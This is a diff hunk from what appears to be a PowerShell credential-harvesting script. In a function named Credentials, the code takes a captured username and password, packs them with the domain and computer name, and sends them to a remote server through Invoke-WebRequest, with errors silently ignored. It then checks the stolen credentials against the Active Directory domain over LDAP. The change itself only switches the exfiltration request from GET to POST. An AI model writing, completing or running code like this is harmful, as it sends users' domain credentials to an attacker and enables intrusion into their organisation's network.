@@ -139,7 +139,7 @@ function Credentials() {
             $Username = $creds.CredentialUserName;
             $Password = $creds.CredentialPassword;
             $post = @{username = $username; password = $password; domain = $domain; computer = $env:COMPUTERNAME }
-            Invoke-WebRequest -UseBasicParsing $Server -GET -Body $post -ErrorAction Ignore
+            Invoke-WebRequest -UseBasicParsing $Server -POST -Body $post -ErrorAction Ignore
             $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
             $domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $username, $password)
 
